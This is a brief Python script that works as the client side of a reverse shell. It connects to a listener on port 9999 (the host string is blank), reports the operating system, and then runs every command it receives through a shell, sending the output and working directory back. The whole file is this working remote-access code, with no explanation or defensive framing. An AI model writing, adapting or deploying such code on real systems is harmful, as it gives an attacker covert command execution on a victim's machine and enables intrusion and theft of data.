import os
import socket
import subprocess
import platform

s = socket.socket()
host = ''
port = 9999
s.connect((host, port))

osname = platform.system()
s.send(str.encode(osname, "utf-8"))

def command():
    while True:
        data = s.recv(2048)
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE )
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '>>>'))
            print(output_str)

command()

s.close()
